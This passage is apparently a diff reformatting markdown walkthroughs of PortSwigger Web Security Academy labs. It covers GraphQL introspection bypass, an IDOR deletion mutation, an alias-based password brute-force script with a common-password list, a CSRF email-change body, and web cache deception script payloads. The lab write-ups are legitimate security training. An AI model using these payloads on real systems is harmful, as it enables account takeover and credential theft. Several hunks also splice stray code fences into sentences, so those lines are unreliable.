Types+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A`
+   ```
+   /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+   ```
 
 4. Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex `"__schema{"`, which the query no longer matches even though it is still a valid introspection query.
 
@@ -9399,7 +9752,9 @@ Notice that the response returns:
 
 `{ "data": { "getUser": null } }`
 
-4. Click on the GraphQL tab and change the `id` variable to find `carlos`'s user ID. In this case, the relevant user ID is `3`.
+4. Click on the GraphQL tab and change the `id` variable to find `carlos```sql
+'s user ID. In this case, the relevant user ID is `3`
+.``
 
 5. In **Target > Site map**, browse the schema again and find the `deleteOrganizationUser` mutation. Notice that this mutation takes a user ID as a parameter.
 
@@ -9409,7 +9764,9 @@ Notice that the response returns:
 
 For example:
 
-`/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D`
+   ```
+   /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
+   ```
 
 ### Lab: Bypassing GraphQL brute force protections
 
@@ -9442,12 +9799,13 @@ To run this script:
 
 You can then use the generated aliases when crafting your request in Repeater.
 
-`
-copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
-bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
-token success }
-`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The
-query has been copied to your clipboard."); `
+   ```
+   copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
+   bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+   token success }
+   `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The
+   query has been copied to your clipboard."); 
+   ```
 
 ##### Solution
 
@@ -9470,12 +9828,12 @@ Bear the following in mind when constructing your request:
      * If you are modifying the request that you sent to Repeater, delete the variable dictionary and `operationName` field from the request before sending. You can do this from Repeater's **Pretty** tab.
      * Ensure that each alias requests the `success` field, as shown in the simplified example below:
 
-```gql
-mutation { bruteforce0:login(input:{password: "123456", username: "carlos"})
-{ token success } bruteforce1:login(input:{password: "password", username:
-"carlos"}) { token success } ... bruteforce99:login(input:{password:
-"12345678", username: "carlos"}) { token success } }
-```
+   ```gql
+   mutation { bruteforce0:login(input:{password: "123456", username: "carlos"})
+   { token success } bruteforce1:login(input:{password: "password", username:
+   "carlos"}) { token success } ... bruteforce99:login(input:{password:
+   "12345678", username: "carlos"}) { token success } }
+   ```
 
 7. Click **Send**.
 
@@ -9525,7 +9883,9 @@ Learn more about [Working with GraphQL in Burp
 
 The body should look like the below:
 
-`query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName;=changeEmail&variables;=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D`
+   ```
+   query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName;=changeEmail&variables;=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
+   ```
 
 10. Right-click the request and select **Engagement tools > Generate CSRF PoC**. Burp displays the **CSRF PoC generator** dialog.
 
@@ -10162,7 +10522,9 @@ to display unreleased products.
 
 2. In Burp, go to **Proxy > HTTP history**. Right-click the category filter request and select **Send to Repeater**.
 
-3. In Repeater, submit a `'` character in the category parameter. Notice that this causes a JavaScript syntax error. This may indicate that the user input was not filtered or sanitized correctly.
+3. In Repeater, submit a ```sql
+'` character in the category parameter. Notice that this causes a JavaScript syntax error. This may indicate that the user input was not filtered or sanitized correctly
+.``
 
 4. Submit a valid JavaScript payload in the value of the category query parameter. You could use the following payload:
 
@@ -10242,7 +10604,9 @@ The password only uses lowercase letters.
 
 2. In Burp, go to **Proxy > HTTP history**. Right-click the `GET /user/lookup?user=wiener` request and select **Send to Repeater**.
 
-3. In Repeater, submit a `'` character in the user parameter. Notice that this causes an error. This may indicate that the user input was not filtered or sanitized correctly.
+3. In Repeater, submit a ```sql
+'` character in the user parameter. Notice that this causes an error. This may indicate that the user input was not filtered or sanitized correctly
+.``
 
 4. Submit a valid JavaScript payload in the `user` parameter. For example, you could use `wiener'+'`
 
@@ -11310,8 +11674,10 @@ deception) Academy topic.
 
 4. In the **Body** section, craft an exploit that navigates the victim user `carlos` to a malicious URL. Make sure to add an arbitrary parameter as a cache buster, so the victim doesn't receive your previously cached response:
 
-`<script>document.location="https://YOUR-LAB-ID.web-security-
-academy.net/resources/..%2fmy-account?wcd"</script>`
+```html
+<script>document.location="https://YOUR-LAB-ID.web-security-
+academy.net/resources/..%2fmy-account?wcd"</script>
+```
 
 5. Click **Deliver exploit to victim**. When the victim views the exploit, the response they receive is stored in the cache.
 
@@ -11412,15 +11778,19 @@ deception) Academy topic.
 
 5. In the **Body** section, craft an exploit that navigates the victim user `carlos` to a malicious URL. Make sure to add an arbitrary parameter as a cache buster:
 
-`<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-
-account%23%2f%2e%2e%2fresources?wcd"</script>`
+   ```html
+   <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-
+   account%23%2f%2e%2e%2fresources?wcd"</script>
+   ```
 
 6. Click **Deliver exploit to victim**.
 
 7. Go to the URL that you delivered to `carlos` in your exploit:
 
-`https://YOUR-LAB-ID.web-security-academy.net/my-
-account%23%2f%2e%2e%2fresources?wcd`
+   ```html
+   https://YOUR-LAB-ID.web-security-academy.net/my-
+   account%23%2f%2e%2e%2fresources?wcd
+   ```
 
 8. Notice that the response includes the API key for the user `carlos`. Copy this.
 
@@ -11495,14 +11865,16 @@ deception) Academy topic.
 
 4. In the **Body** section, craft an exploit that will navigate the victim user to the malicious URL you crafted. Make sure to add an arbitrary parameter as a cache buster:
 
-`<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"</script>`
+   ```html
+   <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"</script>
+   ```
 
 5. Click **Deliver exploit to victim**.
 
 6. Go to the URL that you delivered to the victim in your exploit:
 
-`https://YOUR-LAB-ID.web-security-academy.net/my-
-account;%2f%2e%2e%2frobots.txt?wcd`
+   `https://YOUR-LAB-ID.web-security-academy.net/my-
+   account;%2f%2e%2e%2frobots.txt?wcd`
 
 7. Notice that in Burp's browser this redirects to the account login page. This may be because the browser redirects requests with invalid session data. Attempt the exploit in Burp instead.
 
